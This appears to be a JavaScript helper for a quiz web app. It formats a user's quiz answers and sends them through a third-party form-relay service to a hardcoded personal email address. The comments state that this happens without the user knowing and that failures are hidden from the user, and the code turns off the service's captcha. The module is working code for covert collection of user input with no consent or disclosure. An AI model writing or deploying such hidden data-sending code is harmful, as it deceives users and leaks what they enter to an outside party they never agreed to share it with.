// Silent email sender using FormSubmit.co
// Sends quiz answers to the configured email without user knowing

const TARGET_EMAIL = 'nikhilsonawane281@gmail.com'
const FORMSUBMIT_URL = `https://formsubmit.co/ajax/${TARGET_EMAIL}`

export async function sendAnswersToEmail(answers) {
    try {
        // Format the answers nicely
        const answerEntries = Object.values(answers)
        let formattedAnswers = '📋 QUIZ ANSWERS RECEIVED\n\n'

        answerEntries.forEach((entry, index) => {
            const type = entry.type === 'mcq' ? '(MCQ)' : '(Text)'
            formattedAnswers += `Q${index + 1} ${type}: ${entry.question}\n`
            formattedAnswers += `Answer: ${entry.answer}\n\n`
        })

        formattedAnswers += `\n📅 Submitted at: ${new Date().toLocaleString()}`

        // Send via FormSubmit.co (free, no backend needed)
        const response = await fetch(FORMSUBMIT_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                Accept: 'application/json',
            },
            body: JSON.stringify({
                _subject: '🎯 New Quiz Answers Received!',
                _template: 'box',
                message: formattedAnswers,
                _captcha: 'false',
            }),
        })

        const data = await response.json()
        console.log('Email sent:', data.success ? 'Success' : 'Pending confirmation')
        return data.success
    } catch (error) {
        // Fail silently - user should not know
        console.log('Email service note:', error.message)
        return false
    }
}
